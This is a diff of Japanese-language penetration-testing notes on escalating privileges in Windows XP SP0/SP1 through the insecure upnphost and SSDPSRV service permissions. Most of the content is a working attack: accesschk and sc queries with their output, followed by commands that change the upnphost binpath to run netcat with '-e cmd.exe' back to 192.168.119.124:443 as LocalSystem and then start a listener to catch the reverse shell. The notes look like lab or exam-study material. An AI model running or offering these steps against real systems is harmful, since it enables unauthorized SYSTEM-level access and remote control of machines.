@@ -1,5 +1,137 @@
 # Insecure File Permissions
 
+### Vulunerable Microsoft Services(upnphost and SSDPSRV)
+
+対象: Windows XP
+
+バージョン：SP0/SP1
+
+※ Windows XP SP2以降のwindowsでは、windows serviceの脆弱性を利用することは、ほとんどできない。
+
+https://xor.cat/assets/other/Accesschk.zip
+
+* 脆弱性チェック
+
+  ```cmd
+  accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+  
+  RW SSDPSRV
+          SERVICE_ALL_ACCESS
+  RW upnphost
+          SERVICE_ALL_ACCESS
+  ```
+
+  * -u：エラーを抑制
+  * -w：書き込みアクセス権を検索
+  * -c：windowsサービス
+  * -q：バナーの省略
+  * -v：詳細
+
+* サービスの詳細確認
+
+  ```cmd
+  accesschk.exe /accepteula -ucqv SSDPSRV
+  accesschk.exe /accepteula -ucqv upnphost
+  
+  ----
+  RW NT AUTHORITY\LOCAL SERVICE
+          SERVICE_ALL_ACCESS
+  ```
+
+  RW権限あり
+
+* サービスの設定を確認
+
+  ```cmd
+  sc qc upnphost
+  [SC] GetServiceConfig SUCCESS
+  
+  SERVICE_NAME: upnphost
+          TYPE               : 20  WIN32_SHARE_PROCESS 
+          START_TYPE         : 3   DEMAND_START
+          ERROR_CONTROL      : 1   NORMAL
+          BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService  
+          LOAD_ORDER_GROUP   :   
+          TAG                : 0  
+          DISPLAY_NAME       : Universal Plug and Play Device Host  
+          DEPENDENCIES       : SSDPSRV  
+          SERVICE_START_NAME : NT AUTHORITY\LocalService
+  ```
+
+  →SSDPSRVがスタートしていないと始めることができない
+
+  ```cmd
+  sc qc SSDPSRV
+  sc qc SSDPSRV
+  [SC] GetServiceConfig SUCCESS
+  
+  SERVICE_NAME: SSDPSRV
+          TYPE               : 20  WIN32_SHARE_PROCESS 
+          START_TYPE         : 4   DISABLED
+          ERROR_CONTROL      : 1   NORMAL
+          BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService  
+          LOAD_ORDER_GROUP   :   
+          TAG                : 0  
+          DISPLAY_NAME       : SSDP Discovery Service  
+          DEPENDENCIES       :   
+          SERVICE_START_NAME : NT AUTHORITY\LocalService 
+  ```
+
+  →START_TYPEがDISABLEDとなっておりサービスを開始することができない
+
+* SSDPSRVの状態を確認する
+
+  ```cmd
+  sc query SSDPSRV
+  sc query SSDPSRV
+  
+  SERVICE_NAME: SSDPSRV
+          TYPE               : 20  WIN32_SHARE_PROCESS 
+          STATE              : 1  STOPPED 
+                                  (NOT_STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)
+          WIN32_EXIT_CODE    : 1077       (0x435)
+          SERVICE_EXIT_CODE  : 0  (0x0)
+          CHECKPOINT         : 0x0
+          WAIT_HINT          : 0x0
+  ```
+
+  →サービスは停止状態
+
+* SSDPSRVの開始設定をAUTOMATICに修正する
+
+  ```
+  sc config SSDPSRV start= auto
+  ```
+
+  ※=とautoの間には空白が必要（重要）
+
+* SSDPSRVを開始する
+
+  ```
+  net start SSDPSRV
+  ```
+
+* upnphostの設定を変更する
+
+  ```
+  sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe -nv 192.168.119.124 443 -e C:\WINDOWS\System32\cmd.exe"
+  ```
+
+  ```
+  sc config upnphost obj= ".\LocalSystem" password= ""
+  ```
+
+* upnphostを開始してリバースシェルを取得する
+
+  ```
+  nc -lvnp 443
+  net start upnphost
+  ```
+
+  
+
+
+
 ### Serviioサービスでのケーススタディ
 
 NT権限で実行されるサービスの安全でないファイルパーミッションを悪用する方法
